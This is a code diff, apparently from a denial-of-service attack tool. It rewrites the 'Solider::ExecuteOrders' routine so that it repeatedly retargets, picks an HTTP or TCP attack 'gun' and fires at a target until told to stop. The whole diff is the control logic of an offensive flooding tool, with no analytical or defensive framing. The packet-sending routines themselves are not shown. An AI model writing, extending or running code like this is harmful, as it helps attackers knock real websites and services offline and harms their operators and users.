@@ -5,32 +5,43 @@
 #include "api_interface.h"
 #include "globals.h"
 
-void Solider::ExecuteOrders(const TaskController &task, Informator::AttackMethod method, Attackers::Target target)
+void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &target)
 {
-	switch (method)
+	while(!task.ShouldStop())
 	{
-		case Informator::AttackMethod::HTTPAttack:
+		if(target.NeedWeaponAim())
 		{
-			Attackers::HTTPGun http{task};
-			while(!task.ShouldStop())
-			{
-				http.FireTillDead({target.address, 0});
-			}
-			break;
+			target.Retarget(task);
 		}
-		case Informator::AttackMethod::TCPAttack:
-		{
-			Attackers::TCPGun tcp{task};
 
-			while(!task.ShouldStop())
-			{
-				tcp.FireWithoutProxy(target);
-			}
-			break;
-		}
-		case Informator::AttackMethod::UDPAttack:
+		Attackers::AttackMethod method = target.GetAttackMethod();
+		const CURI coordinates = target.GetCoordinates();
+
+		Attackers::PGun gun;
+
+		switch (method)
 		{
-			throw std::runtime_error("Not implemented");
+			case Attackers::AttackMethod::HTTPAttack:
+			{
+				gun = std::make_unique<Attackers::HTTPGun>(task);
+				break;
+			}
+			case Attackers::AttackMethod::TCPAttack:
+			{
+				gun = std::make_unique<Attackers::TCPGun>(task);
+				break;
+			}
+			case Attackers::AttackMethod::UDPAttack:
+			default:
+			{
+				SPDLOG_ERROR("Not implemented UDP attack request");
+				break;
+			}
+		}
+		if(gun)
+		{
+			gun->FireTillDead(coordinates);
 		}
 	}
+	SPDLOG_INFO("Stoping execution");
 }
